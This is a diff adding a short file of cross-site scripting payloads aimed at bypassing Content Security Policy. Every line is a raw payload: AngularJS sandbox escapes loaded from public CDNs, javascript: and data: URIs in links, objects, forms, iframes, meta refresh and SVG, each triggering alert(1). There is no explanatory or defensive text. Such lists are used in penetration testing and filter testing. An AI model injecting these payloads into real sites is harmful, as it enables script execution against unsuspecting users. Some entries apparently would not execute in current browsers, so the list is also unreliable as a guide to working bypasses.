@@ -1,0 +1,17 @@
+# XSS CSP Bypass Payloads
+<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script><div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
+<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.4.6/angular.min.js"></script><div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
+<link rel=prefetch href="javascript:alert(1)">
+<base href="javascript:/a/-alert(1)//">
+<object data="data:text/html,<script>alert(1)</script>">
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+<script nonce="">alert(1)</script>
+<script>import('data:text/javascript,alert(1)')</script>
+<script src="data:text/javascript,alert(1)"></script>
+<style>@import 'javascript:alert(1)'</style>
+<form action="javascript:alert(1)"><input type=submit>
+<a href="javascript:alert(1)">X</a>
+<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'><a xlink:href='javascript:alert(1)'><rect width='100' height='100'/></a></svg>#x">
+<iframe srcdoc="<script>alert(1)</script>">
+<script>document.location='javascript:alert(1)'</script>
